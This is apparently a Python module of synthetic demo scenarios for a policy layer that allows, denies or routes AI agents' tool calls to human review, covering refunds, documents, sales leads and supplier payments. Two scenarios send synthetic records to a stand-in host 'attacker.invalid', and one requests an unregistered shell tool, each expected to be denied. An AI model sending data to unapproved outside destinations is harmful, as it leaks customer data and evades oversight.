"""Server-owned synthetic scenarios shared by dashboard and CLI demo."""

from copy import deepcopy

_SCENARIOS = [
    {
        "id": "scoped-document",
        "name": "Read a scoped document",
        "description": "Read the support agent's refund policy.",
        "tool": "documents.read",
        "arguments": {"document_id": "refund-policy"},
        "expected": "executed",
    },
    {
        "id": "small-refund",
        "name": "Issue a $25 refund",
        "description": "Request a $25 customer refund and see how the current rule handles it.",
        "tool": "refunds.create",
        "arguments": {"ticket_id": "T-1001", "amount_cents": 2500},
        "expected": "executed",
    },
    {
        "id": "large-refund",
        "name": "Request a $250 refund",
        "description": "Request a $250 customer refund. Starter rules send this for human review.",
        "tool": "refunds.create",
        "arguments": {"ticket_id": "T-1002", "amount_cents": 25000},
        "expected": "pending",
    },
    {
        "id": "out-of-scope-document",
        "name": "Attempt payroll access",
        "description": "The agent tries to read a document outside its scope.",
        "tool": "documents.read",
        "arguments": {"document_id": "payroll"},
        "expected": "denied",
    },
    {
        "id": "unapproved-destination",
        "name": "Attempt external data transfer",
        "description": "The agent tries to send synthetic data to an unapproved destination.",
        "tool": "messages.send",
        "arguments": {
            "destination": "https://attacker.invalid/collect",
            "message": "SYNTHETIC customer record",
        },
        "expected": "denied",
    },
    {
        "id": "unknown-tool",
        "name": "Attempt an unknown tool",
        "description": "The agent requests an unregistered shell tool. No command runs.",
        "tool": "shell.execute",
        "arguments": {"command": "echo synthetic"},
        "expected": "denied",
    },
]


for _item in _SCENARIOS:
    _item["agent_id"] = "support-agent"

_SCENARIOS.extend(
    [
        {
            "id": "sales-lead",
            "agent_id": "sales-agent",
            "name": "Read an approved sales lead",
            "description": "Sales reads a lead assigned to its team.",
            "tool": "crm.read",
            "arguments": {"lead_id": "LEAD-1001"},
            "expected": "executed",
        },
        {
            "id": "sales-message",
            "agent_id": "sales-agent",
            "name": "Send approved sales outreach",
            "description": "Request a message to the inbox listed in the starter sales policy.",
            "tool": "messages.send",
            "arguments": {"destination": "sales-inbox", "message": "SYNTHETIC follow-up"},
            "expected": "executed",
        },
        {
            "id": "sales-external",
            "agent_id": "sales-agent",
            "name": "Block a sales data transfer",
            "description": "Sales tries to send data to an unapproved destination.",
            "tool": "messages.send",
            "arguments": {
                "destination": "https://attacker.invalid",
                "message": "SYNTHETIC lead data",
            },
            "expected": "denied",
        },
        {
            "id": "sales-refund",
            "agent_id": "sales-agent",
            "name": "Block sales from issuing refunds",
            "description": "Ask Sales to issue a refund and check its current tool permissions.",
            "tool": "refunds.create",
            "arguments": {"ticket_id": "T-1001", "amount_cents": 2500},
            "expected": "denied",
        },
        {
            "id": "finance-invoice",
            "agent_id": "finance-agent",
            "name": "Read an approved invoice",
            "description": "Finance reviews a supplier invoice.",
            "tool": "invoices.read",
            "arguments": {"invoice_id": "INV-1001"},
            "expected": "executed",
        },
        {
            "id": "finance-payment",
            "agent_id": "finance-agent",
            "name": "Pay a supplier $200",
            "description": "Request a $200 payment to a supplier in the starter policy.",
            "tool": "payments.create",
            "arguments": {"vendor_id": "V-1001", "amount_cents": 20000},
            "expected": "executed",
        },
        {
            "id": "finance-large-payment",
            "agent_id": "finance-agent",
            "name": "Review a $2,500 supplier payment",
            "description": "Request a $2,500 payment. Starter rules require review above $500.",
            "tool": "payments.create",
            "arguments": {"vendor_id": "V-1001", "amount_cents": 250000},
            "expected": "pending",
        },
        {
            "id": "finance-new-vendor",
            "agent_id": "finance-agent",
            "name": "Block an unknown supplier",
            "description": "Request a supplier payment outside the starter policy.",
            "tool": "payments.create",
            "arguments": {"vendor_id": "V-9999", "amount_cents": 20000},
            "expected": "denied",
        },
    ]
)


def scenarios(agent_id=None):
    return deepcopy(
        [item for item in _SCENARIOS if agent_id is None or item["agent_id"] == agent_id]
    )


def scenario(scenario_id):
    return next((item for item in scenarios() if item["id"] == scenario_id), None)
